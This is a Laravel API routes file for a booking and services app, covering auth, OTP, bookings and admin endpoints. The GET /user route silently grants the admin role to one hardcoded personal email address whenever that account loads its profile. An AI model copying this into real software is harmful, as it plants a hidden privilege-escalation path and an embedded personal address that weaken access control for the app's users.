<?php

use App\Http\Controllers\Api\AuthController;
use App\Http\Controllers\Api\ServiceController;
use Illuminate\Support\Facades\Route;

Route::post('/register', [AuthController::class, 'register']);
Route::post('/verify-registration-otp', [AuthController::class, 'verifyRegistrationOtp']);
Route::post('/resend-registration-otp', [AuthController::class, 'resendRegistrationOtp']);
Route::post('/login', [AuthController::class, 'login']);
Route::get('/services', [ServiceController::class, 'index']);
Route::get('/services/{id}', [ServiceController::class, 'show']);

// Forgot Password Routes
Route::post('/forgot-password', [AuthController::class, 'forgotPassword']);
Route::post('/verify-otp', [AuthController::class, 'verifyOtp']);
Route::post('/reset-password', [AuthController::class, 'resetPassword']);

// Google Auth Routes
Route::get('/auth/google', [AuthController::class, 'redirectToGoogle']);
Route::get('/auth/google/callback', [AuthController::class, 'handleGoogleCallback']);

Route::middleware('auth:sanctum')->group(function () {
    Route::get('/user', function () {
        /** @var \App\Models\User $user */
        $user = auth()->user();
        if ($user && $user->email === 'balisaikumar9491@gmail.com' && $user->role !== 'admin') {
            $user->role = 'admin';
            $user->save();
        }
        return $user;
    });

    // Booking routes
    Route::post('/bookings', [App\Http\Controllers\Api\BookingController::class, 'store']);
    Route::get('/bookings', [App\Http\Controllers\Api\BookingController::class, 'index']);
    Route::get('/bookings/{id}', [App\Http\Controllers\Api\BookingController::class, 'show']);
    Route::patch('/bookings/{id}/status', [App\Http\Controllers\Api\BookingController::class, 'updateStatus']);

    // Provider Request routes
    Route::post('/provider-requests', [App\Http\Controllers\Api\ProviderRequestController::class, 'store']);
    Route::get('/admin/provider-requests', [App\Http\Controllers\Api\ProviderRequestController::class, 'index']);
    Route::post('/admin/provider-requests/{id}/approve', [App\Http\Controllers\Api\ProviderRequestController::class, 'approve']);
    Route::post('/admin/provider-requests/{id}/reject', [App\Http\Controllers\Api\ProviderRequestController::class, 'reject']);

    // Admin User & Provider Management routes
    Route::get('/admin/stats', [App\Http\Controllers\Api\AdminUserController::class, 'stats']);
    Route::get('/admin/users', [App\Http\Controllers\Api\AdminUserController::class, 'index']);
    Route::post('/admin/users/{id}/toggle-block', [App\Http\Controllers\Api\AdminUserController::class, 'toggleBlock']);
    Route::delete('/admin/users/{id}', [App\Http\Controllers\Api\AdminUserController::class, 'destroy']);

    // Services
    Route::post('/services', [ServiceController::class, 'store']);
});
